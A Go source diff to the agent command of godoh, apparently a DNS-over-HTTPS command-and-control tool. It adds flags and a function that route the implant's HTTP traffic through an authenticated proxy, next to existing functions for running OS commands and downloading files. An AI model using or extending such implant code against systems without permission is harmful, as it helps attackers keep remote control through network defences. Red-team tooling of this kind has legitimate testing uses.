@@ -1,15 +1,19 @@
 package cmd
 
 import (
+	"context"
 	"encoding/hex"
 	"fmt"
 	"io/ioutil"
+	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
 
 	"github.com/miekg/dns"
+	"github.com/rs/zerolog/log"
 	"github.com/sensepost/godoh/lib"
 	"github.com/sensepost/godoh/protocol"
 	"github.com/spf13/cobra"
@@ -17,6 +21,11 @@ import (
 
 var agentCmdAgentName string
 var agentCmdAgentPoll int
+
+// Proxy settings
+var proxyAddr string
+var proxyUsername string
+var proxyPassword string
 
 // agentCmd represents the agent command
 var agentCmd = &cobra.Command{
@@ -108,10 +117,15 @@ Example:
 }
 
 func init() {
-	rootCmd.AddCommand(agentCmd)
+	// setup proxy
+	cobra.OnInitialize(configureProxy)
 
+	rootCmd.AddCommand(agentCmd)
 	agentCmd.Flags().StringVarP(&agentCmdAgentName, "agent-name", "n", "", "Agent name to use. (default: random)")
 	agentCmd.Flags().IntVarP(&agentCmdAgentPoll, "poll-time", "t", 10, "Time in seconds between polls.")
+	agentCmd.Flags().StringVarP(&proxyAddr, "proxy", "X", "", "Use proxy, i.e hostname:port")
+	agentCmd.Flags().StringVarP(&proxyUsername, "proxy-username", "U", "", "proxy username to use")
+	agentCmd.Flags().StringVarP(&proxyPassword, "proxy-password", "P", "", "proxy password to use")
 }
 
 // executeCommand executes an OS command
@@ -191,4 +205,40 @@ func downloadFile(fileName string) error {
 	}
 
 	return nil
+}
+
+func configureProxy() {
+	if proxyAddr != "" {
+
+		if proxyUsername == "" || proxyPassword == "" {
+			log.Error().Msg("proxy username or password were not provided")
+			os.Exit(1)
+		}
+
+		dialContext := (&net.Dialer{
+			KeepAlive: 30 * time.Second,
+			Timeout:   30 * time.Second,
+		}).DialContext
+
+		basicDialContext := func(ctx context.Context, network, address string) (net.Conn, error) {
+			conn, err := dialContext(ctx, network, proxyAddr)
+			if err != nil {
+				return conn, err
+			}
+			log.Debug().Str("hostname", proxyAddr).Msg("using proxy")
+			log.Debug().Msg("attempting to inject Basic authentication")
+			err = lib.ProxySetup(conn, address, proxyUsername, proxyPassword, options.UserAgent)
+			if err != nil {
+				log.Error().Msg("failed to inject Basic authentication")
+				return conn, err
+			}
+			return conn, err
+		}
+
+		http.DefaultTransport.(*http.Transport).Proxy = nil
+		http.DefaultTransport.(*http.Transport).DialContext = basicDialContext
+
+	} else {
+		log.Debug().Msg("proxy address not set")
+	}
 }
